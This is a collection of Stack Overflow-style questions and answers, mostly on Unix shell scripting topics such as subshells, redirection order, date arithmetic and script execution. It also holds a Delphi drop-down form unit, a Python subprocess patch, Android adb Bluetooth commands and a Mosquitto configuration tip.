    "When does command substitution spawn more subshells than the same commands in isolation?": "Update and caveat:\nThis answer has a troubled past in that I confidently claimed things that turned out not to be true. I believe it has value in its current form, but please help me eliminate other inaccuracies (or convince me that it should be deleted altogether).\nI've substantially revised - and mostly gutted - this answer after @kojiro pointed out that my testing methods were flawed (I originally used ps to look for child processes, but that's too slow to always detect them); a new testing method is described below.\nI originally claimed that not all bash subshells run in their own child process, but that turns out not to be true.\nAs @kojiro states in his answer, some shells - other than bash - DO sometimes avoid creation of child processes for subshells, so, generally speaking in the world of shells, one should not assume that a subshell implies a child process.\nAs for the OP's cases in bash (assumes that command{n} instances are simple commands):\n# Case #1\ncommand1         # NO subshell\nvar=$(command1)  # 1 subshell (command substitution)\n\n# Case #2\ncommand1 | command2         # 2 subshells (1 for each pipeline segment)\nvar=$(command1 | command2)  # 3 subshells: + 1 for command subst.\n\n# Case #3\ncommand1 | command2 ; var=$?         # 2 subshells (due to the pipeline)\nvar=$(command1 | command2 ; echo $?) # 3 subshells: + 1 for command subst.;\n                                     #   note that the extra command doesn't add \n                                     #   one\nIt looks like using command substitution ($(...)) always adds an extra subshell in bash - as does enclosing any command in (...).\nI believe, but am not certain these results are correct; here's how I tested (bash 3.2.51 on OS X 10.9.1) - please tell me if this approach is flawed:\nMade sure only 2 interactive bash shells were running: one to run the commands, the other to monitor.\nIn the 2nd shell I monitored the fork() calls in the 1st with sudo dtruss -t fork -f -p {pidOfShell1} (the -f is necessary to also trace fork() calls \"transitively\", i.e. to include those created by subshells themselves).\nUsed only the builtin : (no-op) in the test commands (to avoid muddling the picture with additional fork() calls for external executables); specifically:\n:\n$(:)\n: | :\n$(: | :)\n: | :; :\n$(: | :; :)\nOnly counted those dtruss output lines that contained a non-zero PID (as each child process also reports the fork() call that created it, but with PID 0).\nSubtracted 1 from the resulting number, as running even just a builtin from an interactive shell apparently involves at least 1 fork().\nFinally, assumed that the resulting count represents the number of subshells created.\nBelow is what I still believe to be correct from my original post: when bash creates subshells.\nbash creates subshells in the following situations:\nfor an expression surrounded by parentheses ( (...) )\nexcept directly inside [[ ... ]], where parentheses are only used for logical grouping.\nfor every segment of a pipeline (|), including the first one\nNote that every subshell involved is a clone of the original shell in terms of content (process-wise, subshells can be forked from other subshells (before commands are executed)).\nThus, modifications of subshells in earlier pipeline segments do not affect later ones.\n(By design, commands in a pipeline are launched simultaneously - sequencing only happens through their connected stdin/stdout pipes.)\nbash 4.2+ has shell option lastpipe (OFF by default), which causes the last pipeline segment NOT to run in a subshell.\nfor command substitution ($(...))\nfor process substitution (<(...))\ntypically creates 2 subshells; in the case of a simple command, @konsolebox came up with a technique to only create 1: prepend the simple command with exec (<(exec ...)).\nbackground execution (&)\nCombining these constructs will result in more than one subshell.",
    "\"source\" command in shell script not working [duplicate]": "source is a command implemented in bash, but not in sh. There are multiple ways to fix your script. Choose either one.\nRun the script using bash interpreter\nWhen you are invoking the xRUN script - you are explicitly telling it to be interpreted by sh\n$ sh xRUN \nTo change and interpret the script with bash instead do\n$ bash xRUN \nThis will make bash interpret the source command, and your script will work.\nUse dot command to make script bourne compatible\nYou can also change the source with a dot command which does the same thing but is supported in both bourne and bash.\nChange the line:\nsource set_puregev_env\nWith:\n. set_puregev_env \nNow the script will work with either sh or bash.\nMake script executable\nYou should also run the script directly to avoid confusions like these by making it executable chmod +x xRUN, and invoking it like this:\n$ ./xRUN\nIt will then use the command specified in the shebang and use the rest of the script as input. In your case it will use bash - since that is specified in the shebang.",
    "Why does subprocess.Popen() with shell=True work differently on Linux vs Windows?": "Actually on Windows, it does use cmd.exe when shell=True - it prepends cmd.exe /c (it actually looks up the COMSPEC environment variable but defaults to cmd.exe if not present) to the shell arguments. (On Windows 95/98 it uses the intermediate w9xpopen program to actually launch the command).\nSo the strange implementation is actually the UNIX one, which does the following (where each space separates a different argument):\n/bin/sh -c gcc --version\nIt looks like the correct implementation (at least on Linux) would be:\n/bin/sh -c \"gcc --version\" gcc --version\nSince this would set the command string from the quoted parameters, and pass the other parameters successfully.\nFrom the sh man page section for -c:\nRead commands from the command_string operand instead of from the standard input.  Special parameter 0 will be set from the command_name operand and the positional parameters ($1, $2, etc.)  set from the remaining argument operands.\nThis patch seems to fairly simply do the trick:\n--- subprocess.py.orig  2009-04-19 04:43:42.000000000 +0200\n+++ subprocess.py       2009-08-10 13:08:48.000000000 +0200\n@@ -990,7 +990,7 @@\n                 args = list(args)\n\n             if shell:\n-                args = [\"/bin/sh\", \"-c\"] + args\n+                args = [\"/bin/sh\", \"-c\"] + [\" \".join(args)] + args\n\n             if executable is None:\n                 executable = args[0]",
    "Cross platform git hooks": "The git hooks are really no different than any shell script in that the best-practices for keeping them \"cross-platform\" apply just the same. The minor difference is that you may also be targeting the Windows *nix emulation layers as major users of these hooks as well, and these can be comparatively crippled by comparison to most actual Unix environments.\nI just ported a post-commit hook (and wrote a pre-commit hook) to the default Git for Windows, which uses MINGW32. A few of the changes I had to make since the previous version made some assumptions about the scripting environment available:\nno readlink available, but it was ineffectual on Windows anyway, so I just hacked in a check of which readlink and no-oped if there was none\nredirecting to /dev/null doesn't work in Windows, instead you have to redirect to nul, to do this I just did a uname -s check and set a variable for what to redirect to\nno mktemp available, but since it was a directory that we ended up pruning anyway, we used a naively hard-coded directory name\nfor some reason, redirecting of STDOUT via exec >>$out works fine in MINGW32, but exec 2>>$err for STDERR does not (it seems to die silently), so unfortunately we just had to eschew that redirection\nOther than that, it worked pretty well as-is because there wasn't a lot of platform-specific \"stuff\" in it. So just stick to best practices for making cross-platform scripts and that should get you at least 80% of the way there. After that, test test test in all of the various environments you're targeting.",
    "Alternative for-loop construct": "[W]hy is this not propagated to the other loop-constructs?\nBraced forms of while and until commands would be syntactically ambiguous because you can't separate test-commands from consequent-commands without having a distinctive delimiter between them as they are both defined by POSIX to be compound lists.\nFor example, a shell that supports such constructs can choose either one of the brace groups in the command below as consequent-commands and either way it would be a reasonable choice.\nwhile true; { false; }; { break; }\nBecause of its ambiguous form, this command can be translated to either of the below; neither is a more accurate translation than the other, and they do completely different things.\nwhile true; do\n    false\ndone\nbreak\nwhile true; { false; }; do\n    break\ndone\nThe for command is immune to this ambiguity because its first part\u2014a variable name optionally followed by in and a list of words, or a special form of the (( compound command\u2014can easily be distinguished from the brace group that forms its second part.\nGiven that we already have a consistent syntax for while and until commands, I don't really see any point in propagating this alternate form to them.\nWrt its origin, see:\nCharacteristical common properties of the traditional Bourne shells,\nStephen Bourne's talk at BSDCon,\nUnix v7 source code, sh/cmd.c.",
    "How to simulate drop-down form in Delphi?": "At the bottom of procedure TForm3.Button1Click(Sender: TObject); you call frmPopup.Show; change that to ShowWindow(frmPopup.Handle, SW_SHOWNOACTIVATE); and after that you need to call frmPopup.Visible := True; else the components on the form won't show\nSo the new procedure looks like this:\nuses\n  frmPopupU;\n\nprocedure TForm3.Button1Click(Sender: TObject);\nvar\n  frmPopup: TfrmPopup;\n  pt: TPoint;\nbegin\n  frmPopup := TfrmPopup.Create(Self);\n  frmPopup.BorderStyle := bsNone;\n\n  //We want the dropdown form \"owned\", but not \"parented\" to us\n  frmPopup.Parent := nil; //the default anyway; but just to reinforce the idea\n  frmPopup.PopupParent := Self;\n\n  //Show the form just under, and right aligned, to this button\n  frmPopup.Position := poDesigned;\n  pt := Self.ClientToScreen(Button1.BoundsRect.BottomRight);\n  Dec(pt.X, frmPopup.ClientWidth);\n  frmPopup.Left := pt.X;\n  frmPopup.Top := pt.Y;\n\n  //  frmPopup.Show;\n  ShowWindow(frmPopup.Handle, SW_SHOWNOACTIVATE);\n  //Else the components on the form won't show\n  frmPopup.Visible := True;\nend;\nBut this won't prevent you popup from stealing focus. Inorder for preventing that, you need to override the WM_MOUSEACTIVATE event in your popup form\ntype\n  TfrmPopup = class(TForm)\n...\n    procedure WMMouseActivate(var Message: TWMMouseActivate); message WM_MOUSEACTIVATE;\n...\n  end;\nAnd the implementation\nprocedure TfrmPopup.WMMouseActivate(var Message: TWMMouseActivate);\nbegin\n  Message.Result := MA_NOACTIVATE;\nend;\nI've decided to play arround with your popup window: The first thing I added was a close button. Just a simple TButton which in its onCLick Event calls Close:\nprocedure TfrmPopup.Button1Click(Sender: TObject);\nbegin\n  Close;\nend;\nBut that would only hide the form, in order for freeing it I added a OnFormClose event:\nprocedure TfrmPopup.FormClose(Sender: TObject; var Action: TCloseAction);\nbegin\n  Action := caFree;\nend;\nThen finally I thought it would be funny to add a resize function\nI did that by overriding the WM_NCHITTEST Message :\nprocedure TfrmPopup.WMNCHitTest(var Message: TWMNCHitTest);\nconst\n  EDGEDETECT = 7; //adjust to suit yourself\nvar\n  deltaRect: TRect; //not really used as a rect, just a convenient structure\nbegin\n  inherited;\n\n  with Message, deltaRect do\n  begin\n    Left := XPos - BoundsRect.Left;\n    Right := BoundsRect.Right - XPos;\n    Top := YPos - BoundsRect.Top;\n    Bottom := BoundsRect.Bottom - YPos;\n\n    if (Top < EDGEDETECT) and (Left < EDGEDETECT) then\n      Result := HTTOPLEFT\n    else if (Top < EDGEDETECT) and (Right < EDGEDETECT) then\n      Result := HTTOPRIGHT\n    else if (Bottom < EDGEDETECT) and (Left < EDGEDETECT) then\n      Result := HTBOTTOMLEFT\n    else if (Bottom < EDGEDETECT) and (Right < EDGEDETECT) then\n      Result := HTBOTTOMRIGHT\n    else if (Top < EDGEDETECT) then\n      Result := HTTOP\n    else if (Left < EDGEDETECT) then\n      Result := HTLEFT\n    else if (Bottom < EDGEDETECT) then\n      Result := HTBOTTOM\n    else if (Right < EDGEDETECT) then\n      Result := HTRIGHT;\n  end;\nend;\nSo finally I've ended up with this :\nunit frmPopupU;\n\ninterface\n\nuses\n  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,\n  Dialogs, StdCtrls;\n\ntype\n  TfrmPopup = class(TForm)\n    Button1: TButton;\n    procedure Button1Click(Sender: TObject);\n    procedure FormClose(Sender: TObject; var Action: TCloseAction);\n    procedure FormCreate(Sender: TObject);\n  private\n    procedure WMMouseActivate(var Message: TWMMouseActivate); message WM_MOUSEACTIVATE;\n    procedure WMNCHitTest(var Message: TWMNCHitTest); message WM_NCHITTEST;\n  public\n    procedure CreateParams(var Params: TCreateParams); override;\n  end;\n\nimplementation\n\n{$R *.dfm}\n\n{ TfrmPopup }\n\nprocedure TfrmPopup.Button1Click(Sender: TObject);\nbegin\n  Close;\nend;\n\nprocedure TfrmPopup.CreateParams(var Params: TCreateParams);\nconst\n  CS_DROPSHADOW = $00020000;\nbegin\n  inherited CreateParams({var}Params);\n  Params.WindowClass.Style := Params.WindowClass.Style or CS_DROPSHADOW;\nend;\n\nprocedure TfrmPopup.FormClose(Sender: TObject; var Action: TCloseAction);\nbegin\n  Action := caFree;\nend;\n\nprocedure TfrmPopup.FormCreate(Sender: TObject);\nbegin\n  DoubleBuffered := true;\n  BorderStyle := bsNone;\nend;\n\nprocedure TfrmPopup.WMMouseActivate(var Message: TWMMouseActivate);\nbegin\n  Message.Result := MA_NOACTIVATE;\nend;\n\nprocedure TfrmPopup.WMNCHitTest(var Message: TWMNCHitTest);\nconst\n  EDGEDETECT = 7; //adjust to suit yourself\nvar\n  deltaRect: TRect; //not really used as a rect, just a convenient structure\nbegin\n  inherited;\n\n  with Message, deltaRect do\n  begin\n    Left := XPos - BoundsRect.Left;\n    Right := BoundsRect.Right - XPos;\n    Top := YPos - BoundsRect.Top;\n    Bottom := BoundsRect.Bottom - YPos;\n\n    if (Top < EDGEDETECT) and (Left < EDGEDETECT) then\n      Result := HTTOPLEFT\n    else if (Top < EDGEDETECT) and (Right < EDGEDETECT) then\n      Result := HTTOPRIGHT\n    else if (Bottom < EDGEDETECT) and (Left < EDGEDETECT) then\n      Result := HTBOTTOMLEFT\n    else if (Bottom < EDGEDETECT) and (Right < EDGEDETECT) then\n      Result := HTBOTTOMRIGHT\n    else if (Top < EDGEDETECT) then\n      Result := HTTOP\n    else if (Left < EDGEDETECT) then\n      Result := HTLEFT\n    else if (Bottom < EDGEDETECT) then\n      Result := HTBOTTOM\n    else if (Right < EDGEDETECT) then\n      Result := HTRIGHT;\n  end;\nend;\n\nend.\nHope you can use it.\nFull and functional code\nThe following unit was tested only in Delphi 5 (emulated support for PopupParent). But beyond that, it does everything a drop-down needs. Sertac solved the AnimateWindow problem.\nunit DropDownForm;\n\n{\n    A drop-down style form.\n\n    Sample Usage\n    =================\n\n        procedure TForm1.SpeedButton1MouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);\n        var\n            pt: TPoint;\n        begin\n            if FPopup = nil then\n                FPopup := TfrmOverdueReportsPopup.Create(Self);\n            if FPopup.DroppedDown then //don't drop-down again if we're already showing it\n                Exit;\n\n            pt := Self.ClientToScreen(SmartSpeedButton1.BoundsRect.BottomRight);\n            Dec(pt.X, FPopup.Width);\n\n            FPopup.ShowDropdown(Self, pt);\n        end;\n\n    Simply make a form descend from TDropDownForm.\n\n        Change:\n            type\n                TfrmOverdueReportsPopup = class(TForm)\n\n        to:\n            uses\n                DropDownForm;\n\n            type\n                TfrmOverdueReportsPopup = class(TDropDownForm)\n}\n\ninterface\n\nuses\n    Forms, Messages, Classes, Controls, Windows;\n\nconst\n    WM_PopupFormCloseUp = WM_USER+89;\n\ntype\n    TDropDownForm = class(TForm)\n    private\n        FOnCloseUp: TNotifyEvent;\n        FPopupParent: TCustomForm;\n        FResizable: Boolean;\n        function GetDroppedDown: Boolean;\n{$IFNDEF SupportsPopupParent}\n        procedure SetPopupParent(const Value: TCustomForm);\n{$ENDIF}\n    protected\n        procedure CreateParams(var Params: TCreateParams); override;\n        procedure WMActivate(var Msg: TWMActivate); message WM_ACTIVATE;\n        procedure WMNCHitTest(var Message: TWMNCHitTest); message WM_NCHITTEST;\n\n        procedure DoCloseup; virtual;\n\n        procedure WMPopupFormCloseUp(var Msg: TMessage); message WM_PopupFormCloseUp;\n\n{$IFNDEF SupportsPopupParent}\n        property PopupParent: TCustomForm read FPopupParent write SetPopupParent;\n{$ENDIF}\n  public\n        constructor Create(AOwner: TComponent); override;\n\n        procedure ShowDropdown(OwnerForm: TCustomForm; PopupPosition: TPoint);\n        property DroppedDown: Boolean read GetDroppedDown;\n        property Resizable: Boolean read FResizable write FResizable;\n\n        property OnCloseUp: TNotifyEvent read FOnCloseUp write FOnCloseUp;\n  end;\n\nimplementation\n\nuses\n    SysUtils;\n\n{ TDropDownForm }\n\nconstructor TDropDownForm.Create(AOwner: TComponent);\nbegin\n    inherited;\n\n    Self.BorderStyle := bsNone; //get rid of our border right away, so the creator can measure us accurately\n    FResizable := True;\nend;\n\nprocedure TDropDownForm.CreateParams(var Params: TCreateParams);\nconst\n    SPI_GETDROPSHADOW = $1024;\n    CS_DROPSHADOW = $00020000;\nvar\n    dropShadow: BOOL;\nbegin\n    inherited CreateParams({var}Params);\n\n    //It's no longer documented (because Windows 2000 is no longer supported)\n    //but use of CS_DROPSHADOW and SPI_GETDROPSHADOW are only supported on XP (5.1) or newer\n    if (Win32MajorVersion > 5) or ((Win32MajorVersion = 5) and (Win32MinorVersion >= 1)) then\n    begin\n        //Use of a drop-shadow is controlled by a system preference\n        if not Windows.SystemParametersInfo(SPI_GETDROPSHADOW, 0, @dropShadow, 0) then\n            dropShadow := False;\n\n        if dropShadow then\n            Params.WindowClass.Style := Params.WindowClass.Style or CS_DROPSHADOW;\n    end;\n\n{$IFNDEF SupportsPopupParent} //Delphi 5 support for \"PopupParent\" style form ownership\n    if FPopupParent <> nil then\n        Params.WndParent := FPopupParent.Handle;\n{$ENDIF}\nend;\n\nprocedure TDropDownForm.DoCloseup;\nbegin\n    if Assigned(FOnCloseUp) then\n        FOnCloseUp(Self);\nend;\n\nfunction TDropDownForm.GetDroppedDown: Boolean;\nbegin\n    Result := (Self.Visible);\nend;\n\n{$IFNDEF SupportsPopupParent}\nprocedure TDropDownForm.SetPopupParent(const Value: TCustomForm);\nbegin\n    FPopupParent := Value;\nend;\n{$ENDIF}\n\nprocedure TDropDownForm.ShowDropdown(OwnerForm: TCustomForm; PopupPosition: TPoint);\nvar\n    comboBoxAnimation: BOOL;\n    i: Integer;\n\nconst\n    AnimationDuration = 200; //200 ms\nbegin\n    //We want the dropdown form \"owned\" by (i.e. not \"parented\" to) the OwnerForm\n    Self.Parent := nil; //the default anyway; but just to reinforce the idea\n    Self.PopupParent := OwnerForm; //Owner means the Win32 concept of owner (i.e. always on top of, cf Parent, which means clipped child of)\n{$IFDEF SupportsPopupParent}\n    Self.PopupMode := pmExplicit; //explicitely owned by the owner\n{$ENDIF}\n\n    //Show the form just under, and right aligned, to this button\n//  Self.BorderStyle := bsNone; moved to during FormCreate; so can creator can know our width for measurements\n    Self.Position := poDesigned;\n    Self.Left := PopupPosition.X;\n    Self.Top := PopupPosition.Y;\n\n    //Use of drop-down animation is controlled by preference\n    if not Windows.SystemParametersInfo(SPI_GETCOMBOBOXANIMATION, 0, @comboBoxAnimation, 0) then\n        comboBoxAnimation := False;\n\n    if comboBoxAnimation then\n    begin\n        //Delphi doesn't react well to having a form show behind its back (e.g. ShowWindow, AnimateWindow).\n        //Force Delphi to create all the WinControls so that they will exist when the form is shown.\n        for i := 0 to ControlCount - 1 do\n        begin\n            if Controls[i] is TWinControl and Controls[i].Visible and\n                    not TWinControl(Controls[i]).HandleAllocated then\n            begin\n                TWinControl(Controls[i]).HandleNeeded;\n                SetWindowPos(TWinControl(Controls[i]).Handle, 0, 0, 0, 0, 0,\n                        SWP_NOSIZE or SWP_NOMOVE or SWP_NOZORDER or SWP_NOACTIVATE or SWP_SHOWWINDOW);\n            end;\n        end;\n        AnimateWindow(Self.Handle, AnimationDuration, AW_VER_POSITIVE or AW_SLIDE or AW_ACTIVATE);\n        Visible := True; // synch VCL\n    end\n    else\n        inherited Show;\nend;\n\nprocedure TDropDownForm.WMActivate(var Msg: TWMActivate);\nbegin\n    //If we are being activated, then give pretend activation state back to our owner\n    if (Msg.Active <> WA_INACTIVE) then\n        SendMessage(Self.PopupParent.Handle, WM_NCACTIVATE, WPARAM(True), -1);\n\n    inherited;\n\n    //If we're being deactivated, then we need to rollup\n    if Msg.Active = WA_INACTIVE then\n    begin\n        {\n            Post a message (not Send a message) to oursleves that we're closing up.\n            This gives a chance for the mouse/keyboard event that triggered the closeup\n            to believe the drop-down is still dropped down.\n            This is intentional, so that the person dropping it down knows not to drop it down again.\n            They want clicking the button while is was dropped to hide it.\n            But in order to hide it, it must still be dropped down.\n        }\n        PostMessage(Self.Handle, WM_PopupFormCloseUp, WPARAM(Self), LPARAM(0));\n    end;\nend;\n\nprocedure TDropDownForm.WMNCHitTest(var Message: TWMNCHitTest);\nvar\n    deltaRect: TRect; //not really used as a rect, just a convenient structure\n    cx, cy: Integer;\nbegin\n    inherited;\n\n    if not Self.Resizable then\n        Exit;\n\n    //The sizable border is a preference\n    cx := GetSystemMetrics(SM_CXSIZEFRAME);\n    cy := GetSystemMetrics(SM_CYSIZEFRAME);\n\n    with Message, deltaRect do\n    begin\n        Left := XPos - BoundsRect.Left;\n        Right := BoundsRect.Right - XPos;\n        Top := YPos - BoundsRect.Top;\n        Bottom := BoundsRect.Bottom - YPos;\n\n        if (Top < cy) and (Left < cx) then\n            Result := HTTOPLEFT\n        else if (Top < cy) and (Right < cx) then\n            Result := HTTOPRIGHT\n        else if (Bottom < cy) and (Left < cx) then\n            Result := HTBOTTOMLEFT\n        else if (Bottom < cy) and (Right < cx) then\n            Result := HTBOTTOMRIGHT\n        else if (Top < cy) then\n            Result := HTTOP\n        else if (Left < cx) then\n            Result := HTLEFT\n        else if (Bottom < cy) then\n            Result := HTBOTTOM\n        else if (Right < cx) then\n            Result := HTRIGHT;\n    end;\nend;\n\nprocedure TDropDownForm.WMPopupFormCloseUp(var Msg: TMessage);\nbegin\n    //This message gets posted to us.\n    //Now it's time to actually closeup.\n    Self.Hide;\n\n    DoCloseup; //raise the OnCloseup event *after* we're actually hidden\nend;\n\nend.",
    "Ash (shell provided by busybox) tutorial [closed]": "http://www.in-ulm.de/~mascheck/various/ash/#busybox from the link seems busybox ash is debian dash.",
    "Date arithmetic in Unix shell scripts": "Assuming you have GNU date, like so:\ndate --date='1 days ago' '+%a'\nAnd similar phrases.",
    "Getting PID of process in Shell Script": "Just grep away grep itself!\nprocess_id=`/bin/ps -fu $USER| grep \"ABCD\" | grep -v \"grep\" | awk '{print $2}'`",
    "Parsing mobileprovision files in bash?": "If your running this on a machine with mac os x, you can use the following:\n/usr/libexec/PlistBuddy -c 'Print :Entitlements:application-identifier' /dev/stdin <<< $(security cms -D -i path_to_mobileprovision)",
    "How to generate a uuid in shell script [duplicate]": "Have you tried\nuuidgen\nIt's installed out-of-the-box on freeBSD systems like MacOS.\nOn Fedora, CentOS, and RHEL, get it from the util-linux package (CentOS6 has it in util-linux-ng). On debian, get it with sudo apt-get install uuid-runtime. On other linux systems, try looking for the e2fsprogs package.",
    "Shell redirection i/o order": "The Bash manual has a clear example (similar to yours) to show that the order matters and also explains the difference. Here's the relevant part excerpted (emphasis mine):\nNote that the order of redirections is significant. For example, the command\nls > dirlist 2>&1\ndirects both standard output (file descriptor 1) and standard error (file descriptor 2) to the file dirlist, while the command\nls 2>&1 > dirlist\ndirects only the standard output to file dirlist, because the standard error was made a copy of the standard output before the standard output was redirected to dirlist.\nThis post explains it from the POSIX viewpoint.\nConfusions happen due to a key difference. > redirects not by making left operand (stderr) point to right operand (stdout) but by making a copy of the right operand and assigning it to the left. Conceptually, assignment by copy and not by reference.\nSo reading from left-to-right which is how this is interpreted by Bash: ls > dirlist 2>&1 means redirect stdout to the file dirlist, followed by redirection of stderr to whatever stdout is currently (which is already the file dirlist). However, ls 2>&1 > dirlist would redirect stderr to whatever stdout is currently (which is the screen/terminal) and then redirect stdout to dirlist.",
    "mosquitto-client obtain refused connection": "Just edit Mosquitto configuration file ( /etc/mosquitto/conf.d/mosquitto.conf ) adding these lines...\nallow_anonymous true\nlistener 1883 0.0.0.0\n... and restart Mosquitto (as service or not).\n$ sudo service mosquitto restart\nor\n$ mosquitto --verbose --config-file /etc/mosquitto/conf.d/mosquitto.conf\nAs informed here, since v1.7 (2022) allow_anonymous defaulted to false. It is also useful to check log messages ( /var/log/mosquitto/mosquitto.log ).\nFinally, run Mosquitto subscriber/publisher using --host (-h) parameter and the host IP address (get if from ifconfig or ip -color addr command).",
    "Ruby Backticks - break command into multiple lines?": "You can escape carriage returns with a \\:\n`ls -l \\\n | grep drw-`",
    "A Batch Script To Resize Images [closed]": "Once you install ImageMagick for Windows, you can use magick command-line tool, e.g.\nmagick.exe mogrify -resize 250x250 -path 250x250/ *.png *.jpg\nmagick.exe mogrify -resize 125x125 -path 125x125/ *.png *.jpg\nNote: Make sure your magick.exe command is in your PATH system variable and you're pointing to the existing or created the destined folders (e.g. mkdir 250x250/ 125x125/ in above case).\nFor Linux/Ubuntu, see: How to easily resize images via command-line?",
    "android enable disable bluetooth via command line": "Updated: 2023-03-10 - Android 12/13\nEnable bluetooth via cmd\nadb shell cmd bluetooth_manager enable\nDisable bluetooth cmd\nadb shell cmd bluetooth_manager disable\nUpdated: 2019-06-22: - Android 11\nPrint current bluetooth status via settings\nadb shell settings get global bluetooth_on \nadb shell settings list global |grep ^bluetooth_on\nEnable Bluetooth via settings\nadb shell settings put global bluetooth_disabled_profiles 1 \nDisable bluetooth settings\nadb shell settings put global bluetooth_disabled_profiles 0\nEnable bluetooth via content\nadb shell content insert \\\n  --uri content://settings/global \\\n  --bind name:s:bluetooth_disabled_profiles \\\n  --bind value:s:1 --user 0 \nDisable bluetooth content\nadb shell content insert \\\n  --uri content://settings/global \\\n  --bind name:s:bluetooth_disabled_profiles \\\n  --bind value:s:0 --user 0 \nAndroid 11/12/13 and older versions\nEnable Bluetooth\nadb shell settings put global bluetooth_on 1\nDisable Bluetooth\nadb shell settings put global bluetooth_on 0\nEnable bluetooth via activity manager\nadb shell am broadcast \\\n  -a android.intent.action.BLUETOOTH_ENABLE --ez state true\nDisable bluetooth via activity manager\nadb shell am broadcast \\\n  -a android.intent.action.BLUETOOTH_ENABLE --ez state false\nEnable/Disable bluetooth via keyevents\nadb shell am start \\\n  -a android.settings.BLUETOOTH_SETTINGS  \\\n  adb shell input keyevent 19\n  adb shell input keyevent 23",
    "How to do something to every file in a directory using bash?": "Assuming you only want to do something to files, the simple solution is to test if $i is a file:\nfor i in * \ndo\n    if test -f \"$i\" \n    then\n       echo \"Doing somthing to $i\"\n    fi\ndone\nYou should really always make such tests, because you almost certainly don't want to treat files and directories in the same way. Note the quotes around the \"$i\" which prevent problems with filenames containing spaces.",
    "How can I convert to date format (DD MMM YYYY) using the shell?": "The GNU coreutils date command supports the input format you have, e.g.:\ndate -f filename.txt +'%d %b %Y'\nOutput:\n10 May 2021\n14 May 2021\n19 May 2021\nPipe it through tr a-z A-Z if you want it in all-caps.\nNote: tested with version 8.30 of GNU coreutils.",
    "BASH: difference between \"export k=1\" vs. \"k=1\"": "export makes the variable available to subprocesses.\nThat is, if you spawn a new process from your script, the variable k won't be available to that subprocess unless you export it. Note that if you change this variable in the subprocess that change won't be visible in the parent process.\nSee section 3.2.3 of this doc for more detail.",
    "List Gradle dependencies for all subprojects": "I believe there\u2019s no built-in way in Gradle to achieve this (without adapting the build configuration) \u2013 unless you manually list the dependencies task for all subprojects as in:\n./gradlew sub1:dependencies sub2:dependencies sub1:subsub:dependencies\nHowever, if you need this feature often enough, then you could create a shell alias for it. Example in bash (e.g., put this in your ~/.bashrc file):\nalias gradle-all-deps='./gradlew dependencies $(./gradlew -q projects \\\n    | grep -Fe ---\\ Project \\\n    | sed -Ee \"s/^.+--- Project '\"'([^']+)'/\\1:dependencies/\"'\")'\nThen simply call gradle-all-deps from the root project directory.",
    "Unix tar: do not preserve full pathnames": "This is ugly... but it works...\nI had this same problem but with multiple folders, I just wanted to flat every files out. You can use the option \"transform\" to pass a sed expression and... it works as expected.\nthis is the expression:\n's/.*\\///g' (delete everything before '/')\nThis is the final command:\ntar --transform 's/.*\\///g' -zcvf tarballName.tgz */*/*.info",
    "finding unique values in a data file": "grep name1 filename | cut -d ' ' -f 4 | sort -u\nThis will find all lines that have name1, then get just the fourth column of data and show only unique values.",
    "Can Haskell be used to write shell scripts?": "Using ghci will just load the module in GHCi. To run it as a script, use runhaskell or runghc:\n#!/usr/bin/env runhaskell\nmain = putStrLn \"Hello World!\"",
    "Increment with bash": "I just tested your code and it seems to correctly increment i.\nYou could try changing your increment syntax from:\ni=`expr $i + 1`\nTo\ni=$((i+1))",
    "how to get day of the year in shell?": "From the coreutils date manual:\n%j     day of year (001..366)",
    "Check that a variable is a number in UNIX shell [duplicate]": "if echo $var | egrep -q '^[0-9]+$'; then\n    # $var is a number\nelse\n    # $var is not a number\nfi",
    "executing shell script without calling sh implicitly": "Make the first line of the script\n#!/bin/sh\nThen make it executable by typing the command:\nchmod +x shellscript.sh\nIf you now place the script in a bin folder that is on your system's PATH variable and you will be able to run it directly. To see the folders in your path, type:\necho $PATH\nI usually use /home/[my username]/bin for scripts that I have written so that they don't interfere with other users on the system. If I want them to be for all users, I use /usr/local/bin which is supplied empty on most distributions.\nThe .sh on the end of the script's filename is only a convention to help you remember what kind of file it is. It will still work if you rename it to just shellscript, for example, which will complete your requirements.",
    "How to minify/obfuscate a bash script [closed]": ":P here is something funny.\nsay your script is named origin and the obfuscated one is named obsf.\nhere is origin:\n#!/bin/sh\necho \"fooo\"\nhere is obsf\n$ echo \"echo $(base64 origin)\" > obsf\n$ cat obsf\necho IyEvYmluL3NoCmVjaG8gImZvb28iCg==\n$ chmod +x obsf\nnow rm origin and run obsf like this:\n$ sh obsf | base64 -d | sh\nfooo\nheh :3",
    "How to get Cmd-left/right working with iTerm2 and Vim (without requiring .vimrc changes)?": "I'm using iTerm2 3.4.2 and there's actually a preset that you can select for your profile that enables this.",
    "How can I get the 1st and last date of the previous month in a Bash script?": "Unlike some answers, this will work for the 31st and any other day of the month. I use it to output unix timestamps but the output format is easily adjusted.\nfirst=$(date --date=\"$(date +'%Y-%m-01') - 1 month\" +%s)\nlast=$(date --date=\"$(date +'%Y-%m-01') - 1 second\" +%s)\nExample (today's date is Feb 14, 2019):\necho $first $last\n1546300800 1548979199\nTo output in other formats, change final +%s to a different format such as +%Y-%m-%d or omit for default format in your locale.\nIn case you need, you can also back up an arbitrary number of months like this:\n    # variable must be >= 1\n    monthsago=23\n    date --date=\"$(date +'%Y-%m-01') - ${monthsago} month\"\n    date --date=\"$(date +'%Y-%m-01') - $(( ${monthsago} - 1 )) month - 1 second\"\nExample output (today's date is Feb 15, 2019):\n\nWed Mar 1 00:00:00 UTC 2017\nFri Mar 31 23:59:59 UTC 2017",
    "Suppress error messages in Windows commandline": "Redirect the output to nul\nmkdir \"C:\\users\\charqus\\desktop\\MyFolder\" > nul\nDepending on the command, you may also need to redirect errors too:\nmkdir \"C:\\users\\charqus\\desktop\\MyFolder\" > nul 2> nul\nMicrosoft describes the options here, which is useful reading.",
    "Bash Shell Scripting - detect the Enter key": "Several issues with the posted code. Inline comments detail what to fix:\n#!/bin/bash \n# ^^ Bash, not sh, must be used for read options\n\nread -s -n 1 key  # -s: do not echo input character. -n 1: read only 1 character (separate with space)\n\n# double brackets to test, single equals sign, empty string for just 'enter' in this case...\n# if [[ ... ]] is followed by semicolon and 'then' keyword\nif [[ $key = \"\" ]]; then \n    echo 'You pressed enter!'\nelse\n    echo \"You pressed '$key'\"\nfi",
    "Windows shell string operations (changing backslash to slash)": "The set command has a substitution feature:\nset a=C:\\test\\dir\nset a=%a:\\=/%\necho %a%\nResults in:\nC:/test/dir",
